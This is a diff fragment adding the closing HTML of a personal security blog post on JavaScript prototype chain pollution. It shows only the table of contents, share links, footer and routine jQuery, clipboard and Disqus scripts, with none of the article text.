+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">原型与原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">原型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.</span> <span class="toc-text">原型链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.</span> <span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">利用手段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">例题</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&text=JavaScript原型链污染"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&is_video=false&description=JavaScript原型链污染"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JavaScript原型链污染&body=Check out this article: https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&name=JavaScript原型链污染&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&t=JavaScript原型链污染"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    crownZ
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'crownZz';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
